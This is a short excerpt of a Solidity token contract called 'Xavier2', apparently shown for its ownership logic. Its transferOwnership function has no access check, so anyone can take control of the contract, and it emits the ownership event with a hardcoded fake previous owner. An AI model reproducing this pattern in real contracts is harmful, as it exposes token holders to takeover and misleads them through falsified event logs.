...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        emit OwnershipTransferred(0xD329aa57755d9F80987287F2d2585f5f212C57fa, newOwner);
        _owner = newOwner;
    }
...
contract Xavier2 is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "Xavier2";
  string private _name = "Xavier2";
